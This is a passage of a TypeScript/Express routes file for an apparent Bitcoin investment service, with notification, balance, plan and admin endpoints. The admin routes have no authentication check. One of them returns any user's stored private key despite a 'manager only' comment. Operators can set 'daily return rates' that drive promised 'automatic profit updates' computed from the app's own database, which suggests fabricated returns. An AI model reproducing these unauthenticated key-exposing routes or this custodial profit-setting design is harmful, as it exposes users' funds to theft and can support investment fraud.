          type: "info",
          isRead: false,
        });
      }

      // Don't return private key and password
      const { privateKey, password, ...userResponse } = user;
      res.json(userResponse);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update balance" });
    }
  });

  app.get("/api/admin/stats", async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      const investments = await storage.getActiveInvestments();

      const totalBalance = users.reduce((sum, user) => sum + parseFloat(user.balance), 0);

      res.json({
        totalUsers: users.length,
        totalBalance: totalBalance.toFixed(8),
        activeInvestments: investments.length,
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to get admin stats" });
    }
  });

  // Notification routes
  app.get("/api/notifications/:userId", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const notifications = await storage.getUserNotifications(userId);
      res.json(notifications);
    } catch (error) {
      res.status(500).json({ message: "Failed to get notifications" });
    }
  });

  app.post("/api/notifications", async (req, res) => {
    try {
      const notificationData = notificationSchema.parse(req.body);
      const notification = await storage.createNotification({
        ...notificationData,
        type: notificationData.type || "info",
        isRead: false,
      });
      res.json(notification);
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to create notification" });
    }
  });

  app.patch("/api/notifications/:id/read", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const notification = await storage.markNotificationAsRead(id);
      if (!notification) {
        return res.status(404).json({ message: "Notification not found" });
      }
      res.json(notification);
    } catch (error) {
      res.status(500).json({ message: "Failed to mark notification as read" });
    }
  });

  app.patch("/api/notifications/:userId/mark-all-read", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const notifications = await storage.getUserNotifications(userId);
      
      // Mark all unread notifications as read
      const markPromises = notifications
        .filter(n => !n.isRead)
        .map(n => storage.markNotificationAsRead(n.id));
      
      await Promise.all(markPromises);
      
      res.json({ message: "All notifications marked as read" });
    } catch (error) {
      res.status(500).json({ message: "Failed to mark all notifications as read" });
    }
  });

  app.get("/api/notifications/:userId/unread-count", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const count = await storage.getUnreadNotificationCount(userId);
      res.json({ count });
    } catch (error) {
      res.status(500).json({ message: "Failed to get unread count" });
    }
  });

  // Get user balance from database
  app.get("/api/bitcoin/balance/:userId", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const user = await storage.getUser(userId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }
      res.json({ userId, balance: user.balance, address: user.bitcoinAddress });
    } catch (error) {
      res.status(500).json({ message: "Failed to get user balance", error: error instanceof Error ? error.message : "Unknown error" });
    }
  });

  // Refresh user balance from app database
  app.post("/api/bitcoin/sync-balance/:userId", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      await refreshUserBalance(userId);
      const user = await storage.getUser(userId);
      res.json({ 
        message: "Balance refreshed successfully", 
        balance: user?.balance || "0" 
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to refresh balance", error: error instanceof Error ? error.message : "Unknown error" });
    }
  });

  // Refresh all user balances from database (admin only)
  app.post("/api/admin/sync-all-balances", async (req, res) => {
    try {
      const users = await storage.getAllUsers();
      const refreshPromises = users.map(user => refreshUserBalance(user.id));
      await Promise.all(refreshPromises);
      res.json({ message: `Refreshed balances for ${users.length} users` });
    } catch (error) {
      res.status(500).json({ message: "Failed to refresh balances", error: error instanceof Error ? error.message : "Unknown error" });
    }
  });

  // Get user private key (manager only)
  app.get("/api/admin/user/:id/private-key", async (req, res) => {
    try {
      const userId = parseInt(req.params.id);
      const user = await storage.getUser(userId);

      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Only return private key for manager access
      res.json({ 
        userId: user.id,
        email: user.email,
        bitcoinAddress: user.bitcoinAddress,
        privateKey: user.privateKey 
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to get private key" });
    }
  });

  // Update user investment plan
  app.post("/api/admin/update-plan", async (req, res) => {
    try {
      const { userId, planId } = updatePlanSchema.parse(req.body);

      const user = await storage.updateUserPlan(userId, planId);
      if (!user) {
        return res.status(404).json({ message: "User not found" });
      }

      // Create notification about plan change
      if (planId) {
        const plan = await storage.getInvestmentPlan(planId);
        if (plan) {
          await storage.createNotification({
            userId,
            title: "Investment Plan Updated",
            message: `🎯 Your investment plan has been updated to: ${plan.name}

Daily Return Rate: ${(parseFloat(plan.dailyReturnRate) * 100).toFixed(2)}%
Updates every: ${plan.updateIntervalMinutes} minutes

You will now receive automatic profit updates based on your new plan.`,
            type: 'success',
            isRead: false,
          });
        }
      } else {
        await storage.createNotification({
          userId,
          title: "Investment Plan Removed",
          message: `📋 Your investment plan has been removed.

You are now on the free plan and will no longer receive automatic profit updates.`,
          type: 'info',
          isRead: false,
        });
      }

      res.json({ message: "Plan updated successfully", user });
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update plan" });
    }
  });

  // Update investment plan minimum amount
  app.post("/api/admin/update-plan-amount", async (req, res) => {
    try {
      const { planId, minAmount } = z.object({
        planId: z.number(),
        minAmount: z.string()
      }).parse(req.body);

      const updatedPlan = await storage.updateInvestmentPlanAmount(planId, minAmount);
      if (!updatedPlan) {
        return res.status(404).json({ message: "Investment plan not found" });
      }

      res.json({ message: "Plan minimum amount updated successfully", plan: updatedPlan });
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update plan amount" });
    }
  });

  // Update investment plan daily return rate
  app.post("/api/admin/update-plan-rate", async (req, res) => {
    try {
      const { planId, dailyReturnRate } = z.object({
        planId: z.number(),
        dailyReturnRate: z.string()
      }).parse(req.body);

      const updatedPlan = await storage.updateInvestmentPlanRate(planId, dailyReturnRate);
      if (!updatedPlan) {
        return res.status(404).json({ message: "Investment plan not found" });
      }

      res.json({ message: "Plan daily return rate updated successfully", plan: updatedPlan });
    } catch (error) {
      res.status(400).json({ message: error instanceof Error ? error.message : "Failed to update plan rate" });
    }
  });

  // Test Bitcoin wallet generation (manager only)
  app.post("/api/admin/test-bitcoin-generation", async (req, res) => {
    try {
      const results = [];

      // Generate 5 test wallets to verify functionality
      for (let i = 0; i < 5; i++) {
        const wallet = generateBitcoinWallet();

        // Validate the generated wallet
        const isValidAddress = wallet.address.startsWith('1') || wallet.address.startsWith('3') || wallet.address.startsWith('bc1');
        const hasPrivateKey = wallet.privateKey && wallet.privateKey.length > 0;
        const hasPublicKey = wallet.publicKey && wallet.publicKey.length > 0;

        results.push({
          walletNumber: i + 1,
          address: wallet.address,
          privateKeyLength: wallet.privateKey.length,
          publicKeyLength: wallet.publicKey.length,
          isValidAddress,
          hasPrivateKey,
          hasPublicKey,
          isValid: isValidAddress && hasPrivateKey && hasPublicKey
        });
      }

      const allValid = results.every(r => r.isValid);

      res.json({
        success: allValid,
        message: allValid ? "All Bitcoin wallets generated successfully" : "Some wallet generation issues detected",
        results,
        summary: {
          totalGenerated: results.length,
          validWallets: results.filter(r => r.isValid).length,
          timestamp: new Date().toISOString()
        }
      });
    } catch (error) {
      res.status(500).json({ 
        success: false,
        message: "Bitcoin generation test failed", 
        error: error instanceof Error ? error.message : "Unknown error" 
      });
    }
  });

  const httpServer = createServer(app);

  // Initialize default investment plans if they don't exist
  await initializeDefaultPlans();

  // Start the automatic price update system
  startAutomaticUpdates();

  return httpServer;
}